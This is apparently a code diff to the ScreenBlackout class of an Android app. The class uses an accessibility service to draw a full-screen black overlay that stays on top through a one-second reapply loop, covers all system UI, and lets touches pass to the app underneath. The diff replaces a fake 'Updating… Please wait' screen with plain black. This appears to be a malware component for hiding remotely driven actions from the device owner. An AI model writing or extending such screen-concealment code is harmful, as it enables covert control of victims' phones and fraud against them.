@@ -2,26 +2,19 @@ package com.task.tusker.commands;
 
 import android.graphics.Color;
 import android.graphics.PixelFormat;
-import android.content.res.ColorStateList;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
-import android.view.Gravity;
 import android.view.View;
-import android.view.ViewGroup;
 import android.view.WindowManager;
 import android.widget.FrameLayout;
-import android.widget.LinearLayout;
-import android.widget.ProgressBar;
-import android.widget.TextView;
 import com.task.tusker.services.UnifiedAccessibilityService;
 import org.json.JSONObject;
 
 /**
- * ScreenBlackout — shows a full-screen updating indicator using TYPE_ACCESSIBILITY_OVERLAY.
+ * ScreenBlackout — shows a plain full-screen black overlay using TYPE_ACCESSIBILITY_OVERLAY.
  *
- * - Shows a centered spinner and "Updating… Please wait" message on a black background.
- * - The overlay is non-touchable and has no accessibility nodes, so touches and
+ * - The overlay contains no text or controls and is non-touchable, so touches and
  *   screen-reader navigation continue to reach the underlying app.
  * - Uses FLAG_LAYOUT_NO_LIMITS so the overlay extends beyond all system UI insets.
  * - A 1-second "keep-on-top" loop re-applies the overlay every second to prevent
@@ -154,7 +147,7 @@ public class ScreenBlackout {
                     try {
                         if (service == null || active) return;
 
-                        View v = buildUpdatingOverlay(service);
+                        View v = buildBlackOverlay(service);
 
                         // Real physical display size (includes all insets)
                         android.graphics.Point displaySize = new android.graphics.Point();
@@ -368,55 +361,13 @@ public class ScreenBlackout {
         }
     }
 
-    private View buildUpdatingOverlay(UnifiedAccessibilityService accessibilityService) {
+    private View buildBlackOverlay(UnifiedAccessibilityService accessibilityService) {
         FrameLayout root = new FrameLayout(accessibilityService);
         root.setBackgroundColor(Color.BLACK);
         root.setFocusable(false);
         root.setFocusableInTouchMode(false);
         root.setClickable(false);
         root.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS);
-
-        LinearLayout content = new LinearLayout(accessibilityService);
-        content.setOrientation(LinearLayout.VERTICAL);
-        content.setGravity(Gravity.CENTER);
-        content.setFocusable(false);
-        content.setClickable(false);
-        content.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS);
-
-        float density = accessibilityService.getResources().getDisplayMetrics().density;
-        ProgressBar spinner = new ProgressBar(
-                accessibilityService, null, android.R.attr.progressBarStyleLarge);
-        spinner.setIndeterminate(true);
-        spinner.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO);
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-            spinner.setIndeterminateTintList(ColorStateList.valueOf(Color.WHITE));
-        }
-
-        LinearLayout.LayoutParams spinnerParams = new LinearLayout.LayoutParams(
-                Math.round(56f * density), Math.round(56f * density));
-        spinnerParams.gravity = Gravity.CENTER_HORIZONTAL;
-        content.addView(spinner, spinnerParams);
-
-        TextView message = new TextView(accessibilityService);
-        message.setText("Updating…\nPlease wait");
-        message.setTextColor(Color.WHITE);
-        message.setTextSize(18);
-        message.setGravity(Gravity.CENTER);
-        message.setLineSpacing(Math.round(4f * density), 1f);
-        int padding = Math.round(20f * density);
-        message.setPadding(padding, padding, padding, 0);
-        message.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO);
-
-        LinearLayout.LayoutParams messageParams = new LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
-        messageParams.gravity = Gravity.CENTER_HORIZONTAL;
-        content.addView(message, messageParams);
-
-        FrameLayout.LayoutParams contentParams = new FrameLayout.LayoutParams(
-                ViewGroup.LayoutParams.WRAP_CONTENT,
-                ViewGroup.LayoutParams.WRAP_CONTENT,
-                Gravity.CENTER);
-        root.addView(content, contentParams);
         return root;
     }
 }
